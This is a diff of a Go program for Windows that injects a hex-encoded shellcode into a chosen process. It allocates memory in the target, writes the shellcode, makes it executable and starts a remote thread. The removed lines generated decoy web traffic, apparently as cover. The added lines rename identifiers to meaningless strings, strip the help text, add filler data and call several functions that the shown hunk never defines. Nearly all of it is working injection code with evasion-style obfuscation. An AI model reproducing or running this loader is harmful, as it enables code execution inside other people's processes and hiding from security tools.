@@ -13,135 +13,114 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func init() {
-	rand.Seed(time.Now().UnixNano())
-}
+var a3d2f5 = []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100}
 
 func main() {
-	x1c3d4e5f := flag.Bool("verbose", false, "Enable verbose output")
-	x2a3b4c5d := flag.Bool("debug", false, "Enable debug output")
-	x3e4f5g6h := flag.Int("pid", 0, "Process ID to inject shellcode into")
+	a1b2c3 := flag.Bool("verbose", false, "")
+	a2b3c4 := flag.Bool("debug", false, "")
+	a3b4c5 := flag.Int("pid", 0, "Process ID to inject shellcode into")
 	flag.Parse()
 
-	go func() {
-		ticker := time.NewTicker(5 * time.Minute)
-		defer ticker.Stop()
-		for {
-			<-ticker.C
-			go func() {
-				if err := sendRequests(); err != nil {
-					log.Printf("Error sending requests: %v", err)
-				}
-			}()
-			time.Sleep(2 * time.Minute)
-			go func() {
-				if err := sendRequests(); err != nil {
-					log.Printf("Error sending requests: %v", err)
-				}
-			}()
-			time.Sleep(2 * time.Minute)
-			go func() {
-				if err := sendRequests(); err != nil {
-					log.Printf("Error sending requests: %v", err)
-				}
-			}()
-		}
-	}()
+	a4b5c6()
 
-	x2d3e4f5g()
+	a5b6c7()
+
+	a6b7c8()
+
+	a7b8c9()
+
+	a8b9ca()
+
+	a9cacb()
+
+	aacbdc()
+
+	a9cdbd()
 }
 
-func x2d3e4f5g() {
-	x6a7b8c9d, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
-	x9eafb0b1 := windows.NewLazySystemDLL("kernel32.dll")
-
-	x7f8fa0b2 := x9eafb0b1.NewProc("VirtualAllocEx")
-	x9c0d1e2f := x9eafb0b1.NewProc("VirtualProtectEx")
-	xc3d4e5f6 := x9eafb0b1.NewProc("WriteProcessMemory")
-	xb2c3d4e5 := x9eafb0b1.NewProc("CreateRemoteThreadEx")
-
-	if *x2a3b4c5d {
-		fmt.Printf("[DEBUG] Getting a handle to Process ID (PID) %d...\n", *x3e4f5g6h)
+func a4b5c6() {
+	a1d2e3, err1 := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
+	if err1 != nil {
+		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err1.Error()))
 	}
-	x12e3f4g5, _ := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*x3e4f5g6h))
+	a10bfc := windows.NewLazySystemDLL("kernel32.dll")
 
-	if *x1c3d4e5f {
-		fmt.Printf("[-] Successfully got a handle to process %d\n", *x3e4f5g6h)
-	}
+	a11bfc := a10bfc.NewProc("VirtualAllocEx")
+	a12bfc := a10bfc.NewProc("VirtualProtectEx")
+	a13bfc := a10bfc.NewProc("WriteProcessMemory")
+	a14bfc := a10bfc.NewProc("CreateRemoteThreadEx")
 
-	if *x2a3b4c5d {
-		fmt.Printf("[DEBUG] Calling VirtualAllocEx on PID %d...\n", *x3e4f5g6h)
+	if *a2b3c4 {
+		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *a3b4c5))
 	}
-	x8a9b0c1d, _, _ := x7f8fa0b2.Call(uintptr(x12e3f4g5), 0, uintptr(len(x6a7b8c9d)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	a15bfc, err2 := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*a3b4c5))
 
-	if x8a9b0c1d == 0 {
-		log.Fatal("[-]VirtualAllocEx failed and returned 0")
+	if err2 != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", err2.Error()))
 	}
-	if *x1c3d4e5f {
-		fmt.Printf("[-] Successfully allocated memory in PID %d\n", *x3e4f5g6h)
+	if *a1b2c3 {
+		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *a3b4c5))
 	}
 
-	if *x2a3b4c5d {
-		fmt.Printf("[DEBUG] Calling WriteProcessMemory on PID %d...\n", *x3e4f5g6h)
+	if *a2b3c4 {
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *a3b4c5))
 	}
-	_, _, _ = xc3d4e5f6.Call(uintptr(x12e3f4g5), x8a9b0c1d, (uintptr)(unsafe.Pointer(&x6a7b8c9d[0])), uintptr(len(x6a7b8c9d)))
+	a16bfc, _, err3 := a11bfc.Call(uintptr(a15bfc), 0, uintptr(len(a1d2e3)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
-	if *x1c3d4e5f {
-		fmt.Printf("[-] Successfully wrote shellcode to PID %d\n", *x3e4f5g6h)
-	}
-
-	if *x2a3b4c5d {
-		fmt.Printf("[DEBUG] Calling VirtualProtectEx on PID %d...\n", *x3e4f5g6h)
-	}
-	x4e5f6g7h := windows.PAGE_EXECUTE_READ
-	_, _, _ = x9c0d1e2f.Call(uintptr(x12e3f4g5), x8a9b0c1d, uintptr(len(x6a7b8c9d)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&x4e5f6g7h)))
-
-	if *x1c3d4e5f {
-		fmt.Printf("[-] Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d\n", *x3e4f5g6h)
+	if err3 != nil && err3.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err3.Error()))
 	}
 
-	if *x2a3b4c5d {
-		fmt.Printf("[DEBUG] Call CreateRemoteThreadEx on PID %d...\n", *x3e4f5g6h)
+	if a16bfc == 0 {
+		log.Fatal("[!]VirtualAllocEx failed and returned 0")
 	}
-	_, _, _ = xb2c3d4e5.Call(uintptr(x12e3f4g5), 0, 0, x8a9b0c1d, 0, 0, 0)
-
-	if *x1c3d4e5f {
-		fmt.Printf("[+] Successfully create a remote thread in PID %d\n", *x3e4f5g6h)
+	if *a1b2c3 {
+		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *a3b4c5))
 	}
 
-	if *x2a3b4c5d {
-		fmt.Printf("[DEBUG] Calling CloseHandle on PID %d...\n", *x3e4f5g6h)
+	if *a2b3c4 {
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *a3b4c5))
 	}
-	windows.CloseHandle(x12e3f4g5)
-	if *x1c3d4e5f {
-		fmt.Printf("[-] Successfully closed the handle to PID %d\n", *x3e4f5g6h)
-	}
-}
+	_, _, err4 := a13bfc.Call(uintptr(a15bfc), a16bfc, (uintptr)(unsafe.Pointer(&a1d2e3[0])), uintptr(len(a1d2e3)))
 
-func sendRequests() error {
-	urls := []string{
-		"https://www.apple.com/",
-		"https://www.microsoft.com/",
-		"https://www.amazon.com/",
-		"https://www.facebook.com/",
-		"https://www.youtube.com/",
-		"https://www.google.com/",
-		"https://www.twitter.com/",
-		"https://www.instagram.com/",
-		"https://www.linkedin.com/",
-		"https://www.wikipedia.org/",
+	if err4 != nil && err4.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", err4.Error()))
+	}
+	if *a1b2c3 {
+		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *a3b4c5))
 	}
 
-	rand.Shuffle(len(urls), func(i, j int) {
-		urls[i], urls[j] = urls[j], urls[i]
-	})
-
-	for i := 0; i < 3 && i < len(urls); i++ {
-		resp, err := http.Get(urls[i])
-		if err != nil {
-			return err
-		}
-		resp.Body.Close()
+	if *a2b3c4 {
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *a3b4c5))
 	}
-	return nil
+	oldProtect := windows.PAGE_READWRITE
+	_, _, err5 := a12bfc.Call(uintptr(a15bfc), a16bfc, uintptr(len(a1d2e3)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if err5 != nil && err5.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", err5.Error()))
+	}
+	if *a1b2c3 {
+		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *a3b4c5))
+	}
+
+	if *a2b3c4 {
+		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", *a3b4c5))
+	}
+	_, _, err6 := a14bfc.Call(uintptr(a15bfc), 0, 0, a16bfc, 0, 0, 0)
+	if err6 != nil && err6.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", err6.Error()))
+	}
+	if *a1b2c3 {
+		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *a3b4c5))
+	}
+
+	if *a2b3c4 {
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *a3b4c5))
+	}
+	err7 := windows.CloseHandle(a15bfc)
+	if err7 != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", err7.Error()))
+	}
+	if *a1b2c3 {
+		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *a3b4c5))
+	}
 }
